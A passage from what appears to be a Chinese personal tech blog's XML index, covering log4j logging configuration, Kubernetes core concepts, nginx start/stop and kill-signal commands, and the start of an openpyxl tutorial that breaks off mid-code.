<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">### 全局日志等级配置,输出标准设置 ###  </span><br><span class="line">log4j.rootLogger&#x3D;debug,stdout,DDD,EEE  </span><br><span class="line">### 输出信息到控制台 ###  </span><br><span class="line">log4j.appender.stdout&#x3D;org.apache.log4j.ConsoleAppender  </span><br><span class="line">log4j.appender.stdout.Target&#x3D;System.out  </span><br><span class="line">log4j.appender.stdout.layout&#x3D;org.apache.log4j.PatternLayout  </span><br><span class="line">log4j.appender.stdout.layout.ConversionPattern&#x3D;[%-5p] %d&#123;yyyy-MM-dd HH:mm:ss,SSS&#125; method:%l%n%m%n  </span><br><span class="line">### 输出DEBUG 级别以上的日志到&#x3D;&#x2F;Users&#x2F;tinybye&#x2F;Documents&#x2F;log4j&#x2F;debug.log ###  </span><br><span class="line">log4j.appender.DDD&#x3D;org.apache.log4j.DailyRollingFileAppender  </span><br><span class="line">log4j.appender.DDD.File&#x3D;&#x2F;Users&#x2F;tinybye&#x2F;Documents&#x2F;log4j&#x2F;debug.log  </span><br><span class="line">log4j.appender.DDD.Append&#x3D;true  </span><br><span class="line">log4j.appender.DDD.Threshold&#x3D;DEBUG  </span><br><span class="line">log4j.appender.DDD.layout&#x3D;org.apache.log4j.PatternLayout  </span><br><span class="line">log4j.appender.DDD.layout.ConversionPattern&#x3D;%-d&#123;yyyy-MM-dd HH:mm:ss&#125; [ %t:%r ] - [ %p ] %m%n  </span><br><span class="line">### 输出ERROR 级别以上的日志到&#x3D;&#x2F;Users&#x2F;tinybye&#x2F;Documents&#x2F;log4j&#x2F;error.log ###  </span><br><span class="line">log4j.appender.EEE&#x3D;org.apache.log4j.DailyRollingFileAppender  </span><br><span class="line">log4j.appender.EEE.File&#x3D;&#x2F;Users&#x2F;tinybye&#x2F;Documents&#x2F;log4j&#x2F;error.log  </span><br><span class="line">log4j.appender.EEE.Append&#x3D;true  </span><br><span class="line">log4j.appender.EEE.Threshold&#x3D;ERROR  </span><br><span class="line">log4j.appender.EEE.layout&#x3D;org.apache.log4j.PatternLayout  </span><br><span class="line">log4j.appender.EEE.layout.ConversionPattern&#x3D;%-d&#123;yyyy-MM-dd HH:mm:ss&#125; [ %t:%r ] - [ %p ] %m%n</span><br></pre></td></tr></table></figure>

<h2 id="作用详解"><a href="#作用详解" class="headerlink" title="作用详解"></a>作用详解</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#全局日志等级配置,输出位置</span><br><span class="line">#log4j.rootLogger  &#x3D;   [ level ]   ,  appenderName1 ,  appenderName2 ,  …</span><br><span class="line">log4j.rootLogger&#x3D;error, stdout,logfile</span><br><span class="line">#stdout控制器（标准输出）</span><br><span class="line">log4j.appender.stdout&#x3D;org.apache.log4j.ConsoleAppender #设置Appender</span><br><span class="line">log4j.appender.stdout.Target&#x3D;System.out  #设置输出目标</span><br><span class="line">log4j.appender.stdout.layout&#x3D;org.apache.log4j.PatternLayout #设置布局</span><br><span class="line">log4j.appender.stdout.layout.ConversionPattern&#x3D;%d %p [%c]:%L - %m%n #设置输出格式</span><br><span class="line">#输出日志文件</span><br><span class="line">log4j.appender.logfile&#x3D;org.apache.log4j.RollingFileAppender  #设置Appender</span><br><span class="line">log4j.appender.logfile.File&#x3D;pss.log #默认输出到tomcat的根路径或者运行测试工程的根路径</span><br><span class="line">log4j.appender.logfile.MaxFileSize&#x3D;512KB #设置日志文件的最大内存大小</span><br><span class="line"># Keep three backup files.</span><br><span class="line">log4j.appender.logfile.MaxBackupIndex&#x3D;3  #设置日志文件的最大数量，当日志文件达到最大指定内存时则另外再生成一个文件存放日志</span><br><span class="line">log4j.appender.logfile.Append &#x3D; true #ture则将日志信息增加到指定文件中，false则将日志信息覆盖指定文件内容，默认是true</span><br><span class="line">log4j.appender.logfile.Threshold &#x3D; ERROR  #设置只输出ERROR级别以上的日志</span><br><span class="line"># Pattern to output: date priority [category] - message</span><br><span class="line">log4j.appender.logfile.layout&#x3D;org.apache.log4j.PatternLayout #设置布局</span><br><span class="line">log4j.appender.logfile.layout.ConversionPattern&#x3D;%d %p [%c] - %m%n #设置输出格式</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>日志</tag>
        <tag>log4j</tag>
      </tags>
  </entry>
  <entry>
    <title>kubernetes使用文档</title>
    <url>/2023/12/21/kubernetes%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[<h1 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h1><span id="more"></span>

<p>[toc]</p>
<h2 id="认识Kubernetes？"><a href="#认识Kubernetes？" class="headerlink" title="认识Kubernetes？"></a>认识Kubernetes？</h2><p>开源的、用于管理云平台中<strong>多个主机</strong>上的容器化的应用，<strong>目标</strong>是然给部署容器化的应用简单并且高效（Docker-compose不借助其他工具只可以管理单主机上的）</p>
<h3 id="为什么需要Kubernetes"><a href="#为什么需要Kubernetes" class="headerlink" title="为什么需要Kubernetes"></a>为什么需要Kubernetes</h3><h4 id="传统部署"><a href="#传统部署" class="headerlink" title="传统部署"></a>传统部署</h4><p>两个应用之间环境不隔离（比如写文件时冲突）</p>
<h4 id="虚拟化部署（部署在虚拟机上）"><a href="#虚拟化部署（部署在虚拟机上）" class="headerlink" title="虚拟化部署（部署在虚拟机上）"></a>虚拟化部署（部署在虚拟机上）</h4><p>占用资源过多（启用虚拟机要分配较大的内存）</p>
<h4 id="容器化部署"><a href="#容器化部署" class="headerlink" title="容器化部署"></a>容器化部署</h4><p>环境隔离、占用资源少</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231226151518.png?token=AQXPXNRJQXMJV72UJT35CA3FRJ64G" alt="image-20231225140219138"></p>
<h4 id="Kubernetes的特点"><a href="#Kubernetes的特点" class="headerlink" title="Kubernetes的特点"></a>Kubernetes的特点</h4><ol>
<li>自我修复</li>
<li>弹性伸缩</li>
<li>自动部署和回滚</li>
<li>服务发现和负载均衡</li>
<li>机密和配置管理</li>
<li>存储编排</li>
<li>批处理</li>
</ol>
<h3 id="企业级容器调度平台"><a href="#企业级容器调度平台" class="headerlink" title="企业级容器调度平台"></a>企业级容器调度平台</h3><p>Apache Mesos：</p>
<p>一个分布式调度系统内核、遭遇DOcker产生，Mesos作为资源管理器，从DC/OS角度提供资源视图，主/从结构工作模式，主节点分配任务，并用从节点上的Executor负责执行，通过Zookeeper给主节点提供服务注册、服务发现功能。通过Framwork Marthon提供容器调度的能力。支模拟测试支持超过5w+节点，在大规模上拥有较大优势。</p>
<p>Docker Swarm：</p>
<p>一个有Docker开发的调度框架。好处之一是标准Docker API的使用。由于随Docker引擎一起发布，无需额外安装，配置简单，支持服务注册、服务发现，内置Overlay Network以及Load Balancer。与Docker  CLI非常类似的操作命令，对熟悉Docker的人非常容易上手。适用于中小型系统。</p>
<p>Google Kubernetes：</p>
<p>最流行的容器编排解决方案框架，基于Google庞大的生态圈及社区产生的产品。通过Pods这一抽象的概念，解决Container之间的依赖与通信问题。Pods，Services，Deployments是独立部署的部分，可以通过Selector提供更多的灵活性，内置服务注册表的负载均衡。实用度更广，功能更强大，相较于Mesos拉力说哦节点规模较小。</p>
<h2 id="集群架构与组件"><a href="#集群架构与组件" class="headerlink" title="集群架构与组件"></a>集群架构与组件</h2><p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231225145013.png?token=AQXPXNX2KRSEX7N6D6R7ANDFRETGE" alt="image-20231225145012183"></p>
<ol>
<li>节点分为主、从节点<ol>
<li>只有从节点部署任务</li>
<li>主节点可只做主节点，也可以同时做从节点</li>
</ol>
</li>
<li>所有的操作有个汇聚中心api-server，它维护了k8s中所有对于节点或者任务处理的操作 </li>
<li>对于用户而言，我们通过命令行操作k8s，经由api-server，转换为api调用请求，所以对于机器而言，看到的是restful的请求</li>
</ol>
<h3 id="相关组件"><a href="#相关组件" class="headerlink" title="相关组件"></a>相关组件</h3><h4 id="控制面板组件（在Master节点上）"><a href="#控制面板组件（在Master节点上）" class="headerlink" title="控制面板组件（在Master节点上）"></a>控制面板组件（在Master节点上）</h4><ol>
<li>kube-api-server</li>
<li>kube-controller-manager</li>
<li>cloud-controller-manager</li>
<li>kube-scheduler </li>
<li>etcd</li>
</ol>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231225151913.png?token=AQXPXNXY6FUDMULJHCXLIGLFREWS4" alt="image-20231225151912828"></p>
<h4 id="节点组件-普通节点上"><a href="#节点组件-普通节点上" class="headerlink" title="节点组件(普通节点上)"></a>节点组件(普通节点上)</h4><ol>
<li>kubelet</li>
<li>kube-proxy</li>
<li>container runtime</li>
</ol>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231225181318.png?token=AQXPXNQO7F5UXTUEONC77E3FRFK7W" alt="image-20231225181317304"></p>
<ol>
<li>一台服务器是一个节点</li>
<li>一个节点中可以有多个Pod</li>
<li>一个Pod中至少有一个容器</li>
</ol>
<h4 id="附加组件（可选）"><a href="#附加组件（可选）" class="headerlink" title="附加组件（可选）"></a>附加组件（可选）</h4><ol>
<li>kube-dns：负责为整个集群提供DNS服务</li>
<li>Ingress Controller：为服务提供外网入口</li>
<li>Heapster（或者Prometheus）：提供资源监控</li>
<li>Dashboard：提供GUI</li>
<li>Federation：提供可用区的集群</li>
<li>Fluentd-elasticsearch：提供集群日志采集、存储与查询</li>
</ol>
<h3 id="分层架构"><a href="#分层架构" class="headerlink" title="分层架构"></a>分层架构</h3><ol>
<li>生态系统</li>
<li>接口层</li>
<li>管理层：系统度量（如基础设施、容器和网络的度量）、自动化（如自动扩展、动态Provision等）以及策略管理（RVAC、Quota、PSP、NetworkPolicy等）</li>
<li>应用层：部署（无状态应用、有状态应用、批处理任务、集群应用等）和路由（服务发现、DNS解析等）</li>
<li>核心层：最核心的功能、对外提供API构建高层的应用，对内提供插件式应用执行环境</li>
</ol>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231225203028.png?token=AQXPXNW2EPIZBBYPMRNUS23FRF3CC" alt="image-20231225203027131"></p>
<h3 id="服务的分类"><a href="#服务的分类" class="headerlink" title="服务的分类"></a>服务的分类</h3><h4 id="无状态应用"><a href="#无状态应用" class="headerlink" title="无状态应用"></a>无状态应用</h4><ol>
<li>Nginx</li>
<li>Apache</li>
</ol>
<p>不会对本地环境产生任何依赖，例如不会存储数据到本地磁盘</p>
<p>优点：对客户端透明，无依赖关系，可以高效实现扩容、迁移</p>
<p>缺点：不能存储数据，需要额外的数据服务支撑</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231226155227.png?token=AQXPXNSWKSRZH2EYTM6SECDFRKDHQ" alt="image-20231226155226896"></p>
<h4 id="有状态应用"><a href="#有状态应用" class="headerlink" title="有状态应用"></a>有状态应用</h4><ol>
<li>MySQL</li>
<li>Redis</li>
</ol>
<p>会对本地环境产生依赖，例如需要存储数据到本地磁盘</p>
<p>优点：可以独立存储数据，实现数据管理</p>
<p>缺点：集群环境下需要实现主从、数据同步、备份、水平扩容复杂 </p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231226155240.png?token=AQXPXNWKUZNMJVJP4BIMRBDFRKDII" alt="image-20231226155239190"></p>
<h3 id="资源和对象"><a href="#资源和对象" class="headerlink" title="资源和对象"></a>资源和对象</h3><p>k8s中所有内容都抽象为资源，如Pod、Service、Node等都是资源。“对象”就是“资源”的实例。</p>
<p>对象的创建、删除、修改，都是通过Kubernetes API（即Api Server）进行的。</p>
<h4 id="资源的分类"><a href="#资源的分类" class="headerlink" title="资源的分类"></a>资源的分类</h4><ol>
<li>元数据：<ol>
<li>Horizontal Pod Autoscaler（HPA）：<ul>
<li>Pod自动扩容，可以根据CPU使用率或自定义指标自动对Pod进行扩/缩容</li>
<li>控制管理器每隔30s，查询metrics地资源使用情况</li>
<li>支持三种metrics类型<ul>
<li>预定义metrics（比如Pod的CPU），以利用率地方式计算</li>
<li>自定义地Pod metrics，以原始值（raw value）的方式计算</li>
<li>自定义的object metrics</li>
</ul>
</li>
<li>支持两种metrics查询方式：Heapster和自定义的REST API</li>
<li>支持多metrics</li>
</ul>
</li>
<li>PodTemplate：<ul>
<li>关于Pod的定义，到那时被包含在其他的Kubernetes对象中（例如Deployment、StatefulSet、DaemonSet等控制器）。控制器通过Pod Template信息来创建Pod。</li>
</ul>
</li>
<li>LimitRange：<ul>
<li>对集群内Request和Limits的配置做一个全局统一的限制，相当于批量设置了某一个范围内（某个命名空间）的Pod的资源使用限制</li>
</ul>
</li>
</ol>
</li>
<li>集群：<ol>
<li>Namespace</li>
<li>Node<ul>
<li>节点相当于一台服务器的概念</li>
</ul>
</li>
<li>ClusterRole</li>
<li>ClusterRoleBinding：将ClusterRole和Role绑定到对应的集群上去</li>
</ol>
</li>
<li>命名空间<ol>
<li><p>工作负载型（Pod）</p>
<ol>
<li><p>Pod（容器组）是Kubernetes中最小的可部署单元。一个Pod（容器组）包含了一个应用程序容器（某些情况下可以是多个）、存储资源、一个唯一的网络IP地址、以及一些确定容器该如何运行的选项。Pod容器代表了Kubernetes中一个独立的应用程序运行实例，该实例可能有单个容器或者几个紧耦合在一起的容器组成。</p>
</li>
<li><p>Docker是Kubernetes Pod中施一公最广泛的容器引擎</p>
</li>
<li><p>Kubernetes集群中的Pod存在如下两种使用途径</p>
<ol>
<li>一个Pod中只运行一个容器</li>
<li>一个Pod中运行多个需要互相协作的容器。</li>
</ol>
</li>
<li><p>副本（replicas）：一个Pod可以被复制成多份，每一份可以称为一个副本</p>
</li>
<li><p>控制器：每一个控制器都是一个Pod对象</p>
<ol>
<li><p>适用无状态服务</p>
<ol>
<li>ReplicationController（RC）：<ol>
<li>V1.11就已经废除了</li>
<li>在资源足够情况下，帮助动态更新Pod的副本数</li>
</ol>
</li>
<li>ReplicaSet（RS）：<ol>
<li>对RC的一次升级</li>
<li>帮助我们动态更新Pod的副本数</li>
<li>可以通过selector来选择对哪些Pod生效</li>
<li>只有扩容、缩容能力</li>
</ol>
</li>
<li>Deployment<ol>
<li>对RS的更高层次的封装</li>
<li>创建Replica Set/Pod</li>
<li>滚动升级/回滚</li>
<li>平滑扩容和缩容</li>
<li>暂停与恢复Deployment</li>
</ol>
</li>
</ol>
</li>
<li><p>适用有状态服务</p>
<ol>
<li><p>StatefulSet：专门针对有状态服务的控制器</p>
<ol>
<li><p>介绍：</p>
<ol>
<li>StatefulSet中每个Pod的DNS格式为statefulSetName（0，…，N-1）.serviceName.namespace.svc.cluster.local<ul>
<li>serviceName为Headless Service的名字</li>
<li>0，…，N-1为Pod所在的序号，从0开始到N-1</li>
<li>statefulSetName为StatefulSet的名字</li>
<li>namespace为服务所在的namespace，Headless Service和StatefulSet必须在相同的namespace</li>
<li>.cluster.local为Cluster Domain</li>
</ul>
</li>
</ol>
</li>
<li><p>特点</p>
<ul>
<li><p>解决网络、数据、顺序问题</p>
</li>
<li><p>稳定的持久化存储</p>
</li>
<li><p>稳定的网络标志</p>
</li>
<li><p>有序部署、有序扩展（即Pod是有顺序的，在部署或者扩展的时候要依据定义的顺序依次进行，即从0到N-1，在下一个Pod运行之前所有之前的Pod必须是Running和Ready状态）（基于init containers来实现）</p>
</li>
<li><p>有序收缩、有序删除</p>
</li>
</ul>
</li>
<li><p>组成</p>
<ol>
<li>Headless Service：用于定义网络标志<ol>
<li>Domain Name Server<ul>
<li>域名服务将域名与ip绑定映射</li>
<li>服务名 =&gt; 访问路径（域名） =&gt; ip</li>
</ul>
</li>
<li>VolumeClaimTmplate<ul>
<li>用于创建持久化卷的模板</li>
</ul>
</li>
</ol>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231226223601.png?token=AQXPXNSR5HYSJCX2G4UO4STFRLSQ2" alt="image-20231226223600059"></p>
</li>
<li><p>注意事项：</p>
</li>
</ol>
</li>
</ol>
</li>
<li><p>守护进程</p>
<ol>
<li>DaemonSet：为每一个匹配的Node都部署一个守护进程<ol>
<li>保证在每个Node上都运行一个容器副本，常用来部署一些集群的日志、监控或者其他系统管理员应用。有：<ul>
<li>日志搜集，比如fluentd，logstash等</li>
<li>系统监控，比如Prometheus Node Exporter，colletd，New Relic agent，Ganglia gmond等</li>
<li>系统程序，比如kube-proxy，kube-dns，glusterd，ceph等</li>
</ul>
</li>
</ol>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231227102122.png?token=AQXPXNULJ2MCCOQVLFY2ZELFROFF6" alt="image-20231227102121136"></p>
</li>
<li><p>任务/定时任务：</p>
<ol>
<li>Job：一次性任务，运行完成后Pod销毁，不再重新启动新容器</li>
<li>CronJob：在Job基础上加上了定时功能</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li><p>服务发现</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231227105533.png?token=AQXPXNQ4ZQP2JTP56ECTMTTFROJGC" alt="image-20231227105532226"></p>
<ol>
<li><p>Service：</p>
<ul>
<li>k8s集群内部的网络通信，简写“svc”。Pod不能直接提供给外网访问，而是应该使用service。Service就是把Pod暴漏出来提供服务，Service才是真正的“服务”，它的中文名就叫“服务”</li>
<li>Service是一个应用服务的抽象，定义了Pod逻辑集合和访问这个Pod集合的策略。Service代理Pod集合，对外表现为一个访问入口，访问该入口的请求将经过负载均衡，转发到后端Pod中的容器。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231227110521.png?token=AQXPXNR3M2KSXQQNGUAV2OLFROKK4" alt="image-20231227110520744"></p>
</li>
<li><p>Ingress：：实现嫁给你k8s内部服务暴漏给外网访问的服务</p>
<ol>
<li>ingress-nginx<ul>
<li>反向代理</li>
<li>负载均衡（七层负载）</li>
</ul>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231227110709.png?token=AQXPXNWJ2B2R6RKQUO6I6ODFROKRU" alt="image-20231227110708645"></p>
</li>
</ol>
</li>
<li><p>存储：</p>
<ol>
<li>Volume：数据卷，共享Pod中容器使用的数据。用来放持久化的数据，比如数据库数据。</li>
<li>CSI（Container Storage Interface）：<ol>
<li>来自Kubernetes、Mesos、Docker等社区成员联合制定的一个行业标准接口规范，旨在将任意存储系统暴漏给容器化应用程序</li>
<li>CSI规范定义了存储提供商实现CSI兼容的Volume Plugin的最小操作集和部署建议。CSI规范的主要焦点是声明Volume Plugin必须实现的接口。</li>
</ol>
</li>
</ol>
</li>
<li><p>特殊类型配置：</p>
<ol>
<li>ConfigMap：“键值对”配置文件</li>
<li>Secret：作用同ConfigMap，区别在于可以加密<ol>
<li>Service Account：用来访问Kubernetes API，由Kubernetes自动创建，并且会自动挂载到Pod的/run/secrets/kubernetes.io/serviceaccount目录中</li>
<li>Opaque：base64编码格式的Secret，用来存储密码、密钥等</li>
<li>kubernetes.io/dockerfonfigjson：用来存储私有docker</li>
</ol>
</li>
<li>DownwardAPI：这个模式和其他模式不一样的地方在于它不是为了存放容器的数据也不是用来进行容器和宿主机的数据交换的，而是让pod里的容器能够直接获取到这个pod对象本身的一些信息。<ol>
<li>downwardAPI提供了两种方式用于将pod的信息注入到容器内部<ul>
<li>环境变量：用于单个变量，可以将pod信息和容器信息直接注入容器内部</li>
<li>volume挂在：将pod信息生成文件，直接挂在到容器内部中去</li>
</ul>
</li>
</ol>
</li>
</ol>
</li>
<li><p>其他：</p>
<ol>
<li>Role：一组权限的集合，例如Role可以包含列出Pod权限及列出Deployment权限，Role用于给某个Namespace中的资源进行鉴权</li>
<li>RoldBinding：绑定到对应的命名空间去，可以作用于Role和ClusterRole</li>
</ol>
</li>
</ol>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231226163113.png?token=AQXPXNWS2JFP2GRESYDUW2LFRKHY6" alt="image-20231226163112787"></p>
<h4 id="资源清单"><a href="#资源清单" class="headerlink" title="资源清单"></a>资源清单</h4><h3 id="对象规约和状态"><a href="#对象规约和状态" class="headerlink" title="对象规约和状态"></a>对象规约和状态</h3><h4 id="规约（Spec）"><a href="#规约（Spec）" class="headerlink" title="规约（Spec）"></a>规约（Spec）</h4><p>必需的，描述对象的期望状态</p>
<h4 id="状态（Status）"><a href="#状态（Status）" class="headerlink" title="状态（Status）"></a>状态（Status）</h4><p>表示对象的实际状态，该属性有k8s自己维护，k8s会通过一系列的控制器对对应对象进行管理，让对象尽可能地让实际状态与期望状态重合</p>
<h1 id="深入k8s实战进阶"><a href="#深入k8s实战进阶" class="headerlink" title="深入k8s实战进阶"></a>深入k8s实战进阶</h1>]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx常用命令</title>
    <url>/2023/06/21/nginx%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="Nginx启动、重启、停止命令"><a href="#Nginx启动、重启、停止命令" class="headerlink" title="Nginx启动、重启、停止命令"></a>Nginx启动、重启、停止命令</h2><span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx	// 启动：直接启动</span><br><span class="line">nginx -c nginx.conf	// 启动：指定配置文件启动</span><br><span class="line">nginx -s stop	// 关闭：快速停止</span><br><span class="line">nginx -s quit	// 关闭：完整有序停止</span><br><span class="line">nginx -s reload	// 重启：</span><br></pre></td></tr></table></figure>

<p>或者通过<strong>管理进程</strong>实现：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef | grep nginx 	// 查看进程</span><br><span class="line"></span><br><span class="line"><span class="built_in">kill</span> -quit 进程号（主进程的进程号）	// 即<span class="built_in">kill</span> -3，杀死进程</span><br><span class="line"><span class="built_in">kill</span> -term 进程号（主进程的进程号）	// 即<span class="built_in">kill</span> -15，杀死进程（快速停止）</span><br><span class="line"><span class="built_in">kill</span> -int 进程号（主进程的进程号）	// 即<span class="built_in">kill</span> -2，杀死进程（快速停止）</span><br><span class="line"><span class="built_in">kill</span> -9 进程号（主进程的进程号）	// 杀死进程（强制停止）</span><br></pre></td></tr></table></figure>

<blockquote>
<p>kill -2：功能类似于Ctrl+C是程序在结束之前,能够保存相关数据,然后再退出。</p>
<p>Kill-9:直接强制结束程序。</p>
<p>kill命令默认是15，系统会发送一个SIGTERM的信号给对应的程序。当程序接收到该信号后，具体要如何处理是自己可以决定的</p>
</blockquote>
<p>kill命令具体参数表如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>) SIGHUP    	<span class="number">2</span>) SIGINT    	<span class="number">3</span>) SIGQUIT   	<span class="number">4</span>) SIGILL</span><br><span class="line"><span class="number">5</span>) SIGTRAP   	<span class="number">6</span>) SIGABRT   	<span class="number">7</span>) SIGBUS    	<span class="number">8</span>) SIGFPE</span><br><span class="line"><span class="number">9</span>) SIGKILL   	<span class="number">10</span>) SIGUSR1   	<span class="number">11</span>) SIGSEGV   	<span class="number">12</span>) SIGUSR2</span><br><span class="line"><span class="number">13</span>) SIGPIPE   	<span class="number">14</span>) SIGALRM   	<span class="number">15</span>) SIGTERM   	<span class="number">16</span>) SIGSTKFLT</span><br><span class="line"><span class="number">17</span>) SIGCHLD   	<span class="number">18</span>) SIGCONT   	<span class="number">19</span>) SIGSTOP   	<span class="number">20</span>) SIGTSTP</span><br><span class="line"><span class="number">21</span>) SIGTTIN   	<span class="number">22</span>) SIGTTOU   	<span class="number">23</span>) SIGURG   	<span class="number">24</span>) SIGXCPU</span><br><span class="line"><span class="number">25</span>) SIGXFSZ   	<span class="number">26</span>) SIGVTALRM  	 <span class="number">27</span>) SIGPROF   	  <span class="number">28</span>) SIGWINCH</span><br><span class="line"><span class="number">29</span>) SIGIO    	<span class="number">30</span>) SIGPWR   	<span class="number">31</span>) SIGSYS   	<span class="number">34</span>) SIGRTMIN</span><br><span class="line"><span class="number">35</span>) SIGRTMIN+<span class="number">1</span> 	 <span class="number">36</span>) SIGRTMIN+<span class="number">2</span>   <span class="number">37</span>) SIGRTMIN+<span class="number">3</span>   <span class="number">38</span>) SIGRTMIN+<span class="number">4</span></span><br><span class="line"><span class="number">39</span>) SIGRTMIN+<span class="number">5</span> 	 <span class="number">40</span>) SIGRTMIN+<span class="number">6</span>   <span class="number">41</span>) SIGRTMIN+<span class="number">7</span>   <span class="number">42</span>) SIGRTMIN+<span class="number">8</span></span><br><span class="line"><span class="number">43</span>) SIGRTMIN+<span class="number">9</span> 	 <span class="number">44</span>) SIGRTMIN+<span class="number">10</span>   <span class="number">45</span>) SIGRTMIN+<span class="number">11</span>  <span class="number">46</span>) SIGRTMIN+<span class="number">12</span></span><br><span class="line"><span class="number">47</span>) SIGRTMIN+<span class="number">13</span>  <span class="number">48</span>) SIGRTMIN+<span class="number">14</span>   <span class="number">49</span>) SIGRTMIN+<span class="number">15</span>  <span class="number">50</span>) SIGRTMAX-<span class="number">14</span></span><br><span class="line"><span class="number">51</span>) SIGRTMAX-<span class="number">13</span>  <span class="number">52</span>) SIGRTMAX-<span class="number">12</span>   <span class="number">53</span>) SIGRTMAX-<span class="number">11</span>  <span class="number">54</span>) SIGRTMAX-<span class="number">10</span></span><br><span class="line"><span class="number">55</span>) SIGRTMAX-<span class="number">9</span> 	 <span class="number">56</span>) SIGRTMAX-<span class="number">8</span>    <span class="number">57</span>) SIGRTMAX-<span class="number">7</span> 	<span class="number">58</span>) SIGRTMAX-<span class="number">6</span></span><br><span class="line"><span class="number">59</span>) SIGRTMAX-<span class="number">5</span> 	 <span class="number">60</span>) SIGRTMAX-<span class="number">4</span>    <span class="number">61</span>) SIGRTMAX-<span class="number">3</span>   <span class="number">62</span>) SIGRTMAX-<span class="number">2</span></span><br><span class="line"><span class="number">63</span>) SIGRTMAX-<span class="number">1</span> 	 <span class="number">64</span>) SIGRTMAX</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>openpyxl使用</title>
    <url>/2023/11/03/openpyxl%E4%BD%BF%E7%94%A8%EF%BC%881%EF%BC%89-%E8%A1%A8%E5%92%8C%E5%8D%95%E5%85%83%E6%A0%BC/</url>
    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><span id="more"></span>

<p>openpyxl只能处理xslx表格，处理不了xsl</p>
<p>导入依赖包</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook, load_workbook</span><br></pre></td></tr></table></figure>

<p>工作簿当中有多个工作表，工作表中有多条记录</p>
<h2 id="工作表sheet"><a href="#工作表sheet" class="headerlink" title="工作表sheet"></a>工作表sheet</h2><ol>
<li><h3 id="默认工作表"><a href="#默认工作表" class="headerlink" title="默认工作表"></a>默认工作表</h3></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">wb = Workbook()	<span class="comment"># 实例化一个工作簿</span></span><br><span class="line">wb2 = load_workbook(<span class="string">&#x27;./test2.xlsx&#x27;</span>)  <span class="comment"># 打开已存在的工作簿</span></span><br><span class="line">ws = wb.active  <span class="comment"># 获取默认的工作表，默认创建一个工作表</span></span><br><span class="line"><span class="built_in">print</span>(ws.title)  <span class="comment"># 返回工作表名，Sheet</span></span><br><span class="line"></span><br><span class="line">wb.save(<span class="string">&quot;./test.xlsx&quot;</span>)	<span class="comment"># 保存</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>本地表格读取到内存中，所有操作影响的只是内存中的数据，要想使本地的表格数据变化，需要调用<code>save()</code>方法保存到本地</p>
</blockquote>
<ol start="2">
<li><h3 id="创建工作表"><a href="#创建工作表" class="headerlink" title="创建工作表"></a>创建工作表</h3></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2.创建工作表，create_sheet(title,index)，接收两个参数，表名和位置（从0开始）</span></span><br><span class="line">ws2 = wb.create_sheet(<span class="string">&quot;my_sheet2&quot;</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><h3 id="修改工作表（查、增、删、改）"><a href="#修改工作表（查、增、删、改）" class="headerlink" title="修改工作表（查、增、删、改）"></a>修改工作表（查、增、删、改）</h3></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 3.1工作表信息</span></span><br><span class="line"><span class="built_in">print</span>(ws.max_row)  <span class="comment"># 最大行数，例如14</span></span><br><span class="line"><span class="built_in">print</span>(ws.max_column)  <span class="comment"># 最大列数，例如20</span></span><br><span class="line"><span class="built_in">print</span>(ws.dimensions)  <span class="comment"># 已启用的单元格范围，例如A1:T14</span></span><br><span class="line"><span class="built_in">print</span>(ws.encoding)  <span class="comment"># 编码类型，例如utf-8</span></span><br><span class="line"><span class="built_in">print</span>(ws.sheet_view)  <span class="comment"># 对象信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.2获取何修改表名、获取下标</span></span><br><span class="line"><span class="comment"># 修改表名</span></span><br><span class="line">ws1.title = <span class="string">&quot;my_sheet111&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有表名</span></span><br><span class="line">names = wb.get_sheet_names()  <span class="comment"># 推荐使用下面的获取用法</span></span><br><span class="line">sheet_names = wb.sheetnames</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过表名获取表</span></span><br><span class="line">sheet = wb.get_sheet_by_name(<span 